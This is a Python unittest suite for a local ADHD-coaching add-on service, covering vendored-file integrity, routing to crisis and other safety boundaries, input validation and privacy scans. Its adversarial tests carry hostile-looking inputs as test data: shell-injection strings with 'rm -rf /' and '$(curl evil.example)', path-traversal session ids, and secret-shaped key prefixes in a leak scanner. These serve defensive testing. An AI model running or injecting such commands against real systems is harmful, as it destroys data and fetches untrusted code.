"""addon.unstuck-coach wrapper tests.

Acceptance coverage:
  - vendor pins: vendored method files byte-identical to the canonical repo
    AND matching method-pins.json (A: integrity)
  - router: every branch matches the canonical method's own example lines
  - service: status/coach roundtrip, strict validation, redaction, limits
  - adversarial matrix: 8/8 hostile inputs handled without fakery
  - privacy: no home paths, usernames, or secret-shaped strings in the tree

Run:  python3 -m unittest discover -s tests -v   (from the add-on root)
"""
import hashlib
import json
import os
import sys
import threading
import unittest
import urllib.error
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ADDON_ROOT = os.path.dirname(HERE)
UPSTREAM = os.path.expanduser("~/workspaces/unstuck-coach")
sys.path.insert(0, ADDON_ROOT)

import server  # noqa: E402
import coach_router  # noqa: E402

TEST_PORT = 4898  # dev override; the manifest contract port 4893 is not touched by tests
BASE = f"http://127.0.0.1:{TEST_PORT}"

VENDORED_FILES = (
    "coach/PROJECT_INSTRUCTIONS.md",
    "coach/START_HERE.md",
    "coach/identity.md",
    "coach/rules.md",
    "coach/examples.md",
    "reference/admin-ops-playbooks.md",
    "reference/coaching-protocols.md",
    "reference/mode-router.md",
    "reference/safety-boundaries.md",
    "reference/signal-map.md",
)


def post(payload, raw=None):
    body = raw if raw is not None else json.dumps(payload).encode()
    req = urllib.request.Request(BASE + "/", data=body, headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=10) as resp:
        return resp.status, json.loads(resp.read().decode())


def post_err(payload, raw=None):
    try:
        return post(payload, raw)
    except urllib.error.HTTPError as exc:
        return exc.code, json.loads(exc.read().decode())


def sha256(path):
    with open(path, "rb") as f:
        return hashlib.sha256(f.read()).hexdigest()


class Service:
    def __enter__(self):
        self.httpd = server.ThreadingHTTPServer(("127.0.0.1", TEST_PORT), server.Handler)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        return self

    def __exit__(self, *exc):
        self.httpd.shutdown()
        self.httpd.server_close()
        server._state.update({"sessions": {}, "turns_served": 0, "last_session_id": None})


class TestVendorPins(unittest.TestCase):
    """Vendored method files: byte-identical to canonical + hash-pinned."""

    def test_vendored_files_byte_identical_to_canonical_repo(self):
        for rel in VENDORED_FILES:
            ours, theirs = os.path.join(ADDON_ROOT, "vendor", rel), os.path.join(UPSTREAM, rel)
            self.assertTrue(os.path.exists(theirs), f"canonical missing: {rel}")
            self.assertEqual(sha256(ours), sha256(theirs), f"vendor drift: {rel}")

    def test_vendored_files_match_method_pins(self):
        with open(os.path.join(ADDON_ROOT, "method-pins.json")) as f:
            pins = json.load(f)
        self.assertEqual(len(pins["files"]), len(VENDORED_FILES))
        for rel, digest in pins["files"].items():
            self.assertEqual(sha256(os.path.join(ADDON_ROOT, rel)), digest, f"pin drift: {rel}")

    def test_pinned_commit_is_reported_by_status(self):
        with open(os.path.join(ADDON_ROOT, "method-pins.json")) as f:
            pins = json.load(f)
        self.assertEqual(server._method_commit(), pins["upstream_commit"])

    def test_vendor_tree_contains_nothing_else(self):
        found = set()
        for root, dirs, files in os.walk(os.path.join(ADDON_ROOT, "vendor")):
            dirs[:] = [d for d in dirs if d != "__pycache__"]
            for name in files:
                found.add(os.path.relpath(os.path.join(root, name), os.path.join(ADDON_ROOT, "vendor")))
        self.assertEqual(found, set(VENDORED_FILES))

    def test_method_files_carry_safety_boundaries(self):  # mirrors upstream's own static contract
        text = open(os.path.join(ADDON_ROOT, "vendor", "reference", "safety-boundaries.md")).read().lower()
        self.assertIn("not therapy", text)
        self.assertIn("crisis", text)
        self.assertIn("988", text)


class TestRouter(unittest.TestCase):
    """Every branch proven against the canonical method's own example lines."""

    @classmethod
    def setUpClass(cls):
        cls.router = coach_router.CoachRouter()

    def route(self, text):
        return self.router.route(text)

    def test_crisis_uses_boundary_script_never_coaching(self):
        out = self.route("I want to hurt myself.")
        self.assertEqual(out["protocols"], ["Crisis Boundary"])
        self.assertIn("988", out["reply"])
        self.assertIn("real person", out["reply"])
        self.assertEqual(out["held"], [])
        self.assertIn("vendor/reference/safety-boundaries.md", out["method_refs"])

    def test_capture_parks_and_returns_check(self):
        out = self.route("idea: make a shutdown checklist for Sunday nights")
        self.assertEqual(out["protocols"], ["Natural Capture"])
        self.assertEqual(out["stance"], "Keeper / Remember")
        self.assertIn("Captured: make a shutdown checklist for Sunday nights", out["reply"])
        self.assertEqual(out["held"], ["make a shutdown checklist for Sunday nights"])

    def test_medication_boundary(self):
        out = self.route("should I take more of my meds so I can focus?")
        self.assertEqual(out["protocols"], ["Medication Boundary"])
        self.assertIn("prescriber", out["reply"])

    def test_therapy_boundary(self):
        out = self.route("can you diagnose me with adhd")
        self.assertEqual(out["protocols"], ["Therapy Boundary"])
        self.assertIn("clinician", out["reply"])

    def test_official_deadline_boundary(self):
        out = self.route("I got a court summons and the deadline is Friday.")
        self.assertEqual(out["protocols"], ["Official Deadline Boundary"])
        self.assertIn("cannot be the professional authority", out["reply"])
        self.assertIn("one line", out["reply"])

    def test_imminent_hard_anchor(self):
        out = self.route("Meeting in 5 minutes, haven't eaten, inbox overdue.")
        self.assertEqual(out["protocols"], ["Imminent Hard Anchor"])
        self.assertIn("hard anchor", out["reply"])
        self.assertIn("link open", out["check"])

    def test_body_state_outranks_planning(self):
        out = self.route("I need to pay the bill, eat something, and answer the text, but I am frozen.")
        self.assertEqual(out["stance"], "Ally / Stabilize")
        self.assertIn("Biology comes first", out["reply"])
        self.assertEqual(out["check"], "Reply with one word: fed.")

    def test_recovery_close_extracts_nothing(self):
        out = self.route("I cannot stop even though I am fried.")
        self.assertEqual(out["protocols"], ["Hyperfocus Exit", "Finish Or Park"])
        self.assertIn("breadcrumb", out["reply"])

    def test_three_attempt_escape_blames_plan_not_person(self):
        out = self.route("I tried the same plan three times and failed every time.")
        self.assertEqual(out["protocols"], ["Three-Attempt Escape"])
        self.assertIn("The plan failed; you did not.", out["reply"])

    def test_vague_threat_phrase_does_not_draft(self):
        out = self.route('My boss wrote "we need to talk" and I am sure I am fired.')
        self.assertEqual(out["protocols"], ["Communication Threat Armor"])
        self.assertIn("not a verdict yet", out["reply"])
        self.assertNotIn("draft", out["reply"].lower())

    def test_message_threat_asks_for_the_sentence(self):
        out = self.route("That message makes me feel like I did something wrong.")
        self.assertEqual(out["protocols"], ["Communication Threat Armor"])
        self.assertEqual(out["check"], "What is the sentence?")

    def test_prefixed_brain_dump_sorts_like_canonical_example_15(self):
        out = self.route(
            "brain dump: dentist at 3, bill overdue, dishes smell, email from Alex, "
            "no food, insurance form, buy soap")
        self.assertEqual(out["protocols"], ["Brain Dump To One Action"])
        self.assertIn("I will sort it outside your head.", out["reply"])
        self.assertIn("Body/State: no food", out["reply"])
        self.assertIn("Now: dentist at 3, bill overdue", out["reply"])
        self.assertIn("fed", out["check"])
        self.assertGreaterEqual(len(out["held"]), 2)  # the pile is held, not handed back

    def test_unlabeled_multiline_pile_sorts_too(self):
        out = self.route("pay the water bill\ncall the dentist\ndishes\nreply to Alex\nI am so tired")
        self.assertEqual(out["protocols"], ["Brain Dump To One Action"])
        self.assertIn("Body/State:", out["reply"])

    def test_calendar_routes_to_hard_anchor_first(self):
        out = self.route("My inbox and calendar are a mess and I do not know what is real.")
        self.assertEqual(out["protocols"], ["Calendar Reality Check"])
        self.assertIn("next hard anchor", out["reply"])

    def test_inbox_only_routes_to_live_obligation_rescue(self):
        out = self.route("my inbox is a disaster and I have so much reply debt")
        self.assertEqual(out["protocols"], ["Inbox Triage"])
        self.assertIn("search 'due'", out["reply"])
        self.assertIn("unread count", out["reply"])

    def test_dopamine_menu_is_one_bounded_spark(self):
        out = self.route("I need a dopamine menu before I can start this form.")
        self.assertEqual(out["protocols"], ["Dopamine Menu"])
        self.assertIn("activation fuel, not a lecture", out["reply"])
        self.assertIn("one song", out["reply"])

    def test_return_after_absence_has_no_penalty(self):
        out = self.route("I disappeared from this project for a week.")
        self.assertEqual(out["protocols"], ["Return Without Shame"])
        self.assertIn("No penalty", out["reply"])
        self.assertIn("last real artifact", out["check"])

    def test_start_here_uses_canonical_shape(self):
        out = self.route("I need a coach to get started on this.")
        self.assertEqual(out["protocols"], ["First-Contact Runway"])
        self.assertIn("messy task pile as-is", out["reply"])
        self.assertIn("any three items", out["reply"])
        self.assertNotIn("Green, yellow", out["reply"])  # stuck signal already given: no traffic light first

    def test_vague_input_gets_traffic_light(self):
        out = self.route("hey")
        self.assertEqual(out["protocols"], ["Traffic Light Check"])
        self.assertIn("Green, yellow, or red", out["reply"])

    def test_default_lowers_the_start_line(self):
        out = self.route("I have this huge documentation task hanging over me.")
        self.assertEqual(out["protocols"], ["First-Contact Runway", "Start In The Middle"])
        self.assertIn("Start the contact", out["reply"])

    def test_every_route_carries_reflection_move_check_shape(self):
        for text in (
            "idea: park this", "I am frozen", "we need to talk",
            "brain dump: one, two, three", "my calendar is not real anymore",
            "random project trouble at work",
        ):
            out = self.route(text)
            self.assertTrue(out["reply"].strip())
            self.assertTrue(out["check"].strip())
            self.assertIsInstance(out["held"], list)
            self.assertTrue(out["method_refs"])


class TestStatus(unittest.TestCase):
    def test_status_roundtrip(self):
        with Service():
            code, body = post({"method": "unstuckcoach.status"})
            self.assertEqual(code, 200)
            self.assertTrue(body["ok"])
            self.assertEqual(body["version"], "0.1.0")
            self.assertEqual(body["sessions"], 0)
            self.assertEqual(body["turns_served"], 0)
            self.assertEqual(len(body["method_commit"]), 40)

    def test_get_health(self):
        with Service():
            with urllib.request.urlopen(BASE + "/health", timeout=10) as resp:
                body = json.loads(resp.read().decode())
            self.assertTrue(body["ok"])


class TestCoachSemantics(unittest.TestCase):
    def test_coach_roundtrip_persists_redacted_turn(self):
        with Service():
            code, body = post({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "idea: write the retrospective notes"}})
            self.assertEqual(code, 200)
            self.assertEqual(body["turn"], 1)
            self.assertTrue(body["turn_path"].startswith("var/"))
            with open(os.path.join(ADDON_ROOT, body["turn_path"])) as f:
                on_disk = json.load(f)
            self.assertEqual(on_disk["session_id"], body["session_id"])
            code, status = post({"method": "unstuckcoach.status"})
            self.assertEqual(status["turns_served"], 1)
            self.assertEqual(status["sessions"], 1)

    def test_session_continuity_increments_turns(self):
        with Service():
            _, first = post({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "hey", "session_id": "testsess"}})
            _, second = post({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "idea: more notes", "session_id": "testsess"}})
            self.assertEqual(first["turn"], 1)
            self.assertEqual(second["turn"], 2)

    def test_home_path_in_user_text_is_redacted_on_disk_and_in_response(self):
        home = os.path.expanduser("~")
        with Service():
            code, body = post({"method": "unstuckcoach.coach", "params": {
                "stuck_point": f"idea: file the notes at {home}/notes/retro.md"}})
            self.assertEqual(code, 200)
            self.assertNotIn(home, json.dumps(body))
            with open(os.path.join(ADDON_ROOT, body["turn_path"])) as f:
                on_disk = f.read()
            self.assertNotIn(home, on_disk)
            self.assertIn("~/notes/retro.md", on_disk)  # redacted form present

    def test_session_turn_limit_is_honest_429(self):
        with Service():
            sid = "limitsess"
            for _ in range(server._MAX_TURNS_PER_SESSION):
                code, _ = post({"method": "unstuckcoach.coach", "params": {
                    "stuck_point": "idea: x", "session_id": sid}})
                self.assertEqual(code, 200)
            code, body = post_err({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "idea: x", "session_id": sid}})
            self.assertEqual(code, 429)
            self.assertIn("limit", body["error"])


class TestValidation(unittest.TestCase):
    def test_empty_and_oversized_stuck_point_rejected(self):
        with Service():
            for bad in ("", "x" * 4097):
                code, body = post_err({"method": "unstuckcoach.coach", "params": {"stuck_point": bad}})
                self.assertEqual(code, 400, f"len={len(bad)}")

    def test_control_chars_rejected_but_newlines_tabs_allowed(self):
        with Service():
            code, _ = post_err({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "frozen\x01 now"}})
            self.assertEqual(code, 400)
            code, _ = post_err({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "frozen\x7f now"}})
            self.assertEqual(code, 400)
            code, body = post({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "brain dump:\n- feed the cat\n- pay rent\n- stretch"}})
            self.assertEqual(code, 200)  # canonical multi-line dump input

    def test_unknown_fields_rejected_everywhere(self):
        with Service():
            code, _ = post_err({"method": "unstuckcoach.status", "params": {}, "extra": 1})
            self.assertEqual(code, 400)
            code, _ = post_err({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "hey", "temperature": 0.7}})
            self.assertEqual(code, 400)

    def test_bad_session_id_rejected(self):
        with Service():
            for sid in ("../escape", "a; rm -rf /", "x" * 65, ".hidden", ""):
                code, _ = post_err({"method": "unstuckcoach.coach", "params": {
                    "stuck_point": "hey", "session_id": sid}})
                self.assertEqual(code, 400, sid)


class TestAdversarialMatrix(unittest.TestCase):
    """Eight hostile-input cases, M1..M8. All must pass."""

    def test_m1_oversized_body_413_and_connection_closed(self):
        with Service():
            big = json.dumps({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "x" * 100000}}).encode()
            self.assertGreater(len(big), server.MAX_BODY)
            try:
                post(None, raw=big)
                self.fail("oversized body must not succeed")
            except urllib.error.HTTPError as exc:
                self.assertEqual(exc.code, 413)
                self.assertEqual(exc.headers.get("Connection"), "close")  # announced, not silent

    def test_m2_lying_content_length_times_out_408(self):
        import http.client
        with Service():
            original_timeout = server.Handler.timeout
            server.Handler.timeout = 2  # prod contract is 30; keep the test fast
            try:
                conn = http.client.HTTPConnection("127.0.0.1", TEST_PORT, timeout=10)
                conn.putrequest("POST", "/")
                conn.putheader("Content-Type", "application/json")
                conn.putheader("Content-Length", "5000")
                conn.endheaders()
                conn.send(b"{")  # far fewer bytes than Content-Length promises
                resp = conn.getresponse()
                self.assertEqual(resp.status, 408)
                resp.read()
                conn.close()
            finally:
                server.Handler.timeout = original_timeout

    def test_m3_control_chars_in_stuck_point_400(self):
        with Service():
            code, _ = post_err({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "stuck\x00help"}})
            self.assertEqual(code, 400)

    def test_m4_unknown_field_400(self):
        with Service():
            code, _ = post_err({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "hey", "user_name": "admin"}})
            self.assertEqual(code, 400)

    def test_m5_unknown_method_404(self):
        with Service():
            code, _ = post_err({"method": "unstuckcoach.execute", "params": {}})
            self.assertEqual(code, 404)

    def test_m6_malformed_bodies_400(self):
        with Service():
            for raw in (b"not json", b"[1,2,3]", b'"str"', b"", b"\xff\xfe garbage"):
                code, _ = post_err(None, raw=raw)
                self.assertEqual(code, 400, raw[:12])

    def test_m7_injection_shaped_input_treated_as_data_only(self):
        with Service():
            code, body = post({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "brain dump: '; rm -rf /; --\n$(curl evil.example)\n{x}"}})
            self.assertEqual(code, 200)  # hostile text is inert data: routed, never executed
            self.assertEqual(body["protocols"], ["Brain Dump To One Action"])
            self.assertTrue(body["reply"].strip())
            code, _ = post_err({"method": "unstuckcoach.coach", "params": {
                "stuck_point": "hey", "session_id": "../../etc/passwd"}})
            self.assertEqual(code, 400)  # traversal-shaped session ids never reach the filesystem

    def test_m8_crisis_content_gets_boundary_not_a_plan(self):
        with Service():
            for text in ("I want to hurt myself tonight", "I can't stay safe right now"):
                code, body = post({"method": "unstuckcoach.coach", "params": {"stuck_point": text}})
                self.assertEqual(code, 200)
                self.assertEqual(body["protocols"], ["Crisis Boundary"])
                self.assertIn("988", body["reply"])
                self.assertNotIn("task pile", body["reply"])


class TestPrivacy(unittest.TestCase):  # the lineage has a PII incident: scan hard
    def test_no_home_paths_usernames_or_secrets_in_tree(self):
        # needles built by concatenation so this file never contains them literally.
        # The username needle is the FULL local account name (what home-path
        # leaks contain); the shorter public GitHub handle may legitimately
        # appear in the canonical upstream URL in method-pins.json.
        needles = (
            (os.sep + "Users" + os.sep).encode(),
            b"simon" + b"gonzalez" + b"decruz",
            b"sk-pro" + b"j-", b"AK" + b"IA", b"gh" + b"p_", b"xox" + b"b",
            b"BEGIN RSA " + b"PRIVATE KEY",
            b".cloak" + b"browser", b"PRIVA" + b"TE_",
        )
        for root, dirs, files in os.walk(ADDON_ROOT):
            dirs[:] = [d for d in dirs if d not in ("var", "__pycache__", ".git")]
            for name in files:
                path = os.path.join(root, name)
                if path.endswith(".pyc"):
                    continue
                with open(path, "rb") as f:
                    content = f.read()
                for needle in needles:
                    self.assertNotIn(needle, content, f"{needle!r} leaked in {path}")

    def test_service_layer_never_spawns(self):
        for module_file in ("server.py", "coach_router.py"):
            with open(os.path.join(ADDON_ROOT, module_file)) as f:
                src = f.read()
            for banned in ("subprocess", "os.system", "os.popen", "popen(", "socket.create_connection", "urlopen"):
                self.assertNotIn(banned, src, f"{banned} found in {module_file}")

    def test_manifest_matches_service_contract(self):
        with open(os.path.join(ADDON_ROOT, "addon.json")) as f:
            manifest = json.load(f)
        self.assertEqual(manifest["service"]["entrypoint"], "http://127.0.0.1:4893")
        names = {tool["name"] for tool in manifest["tools"]}
        self.assertEqual(names, {"unstuckcoach.status", "unstuckcoach.coach"})
        self.assertEqual(manifest["requestedCapabilities"], [])
        for tool in manifest["tools"]:
            self.assertEqual(tool["requiredCapabilities"], [])


if __name__ == "__main__":
    unittest.main()
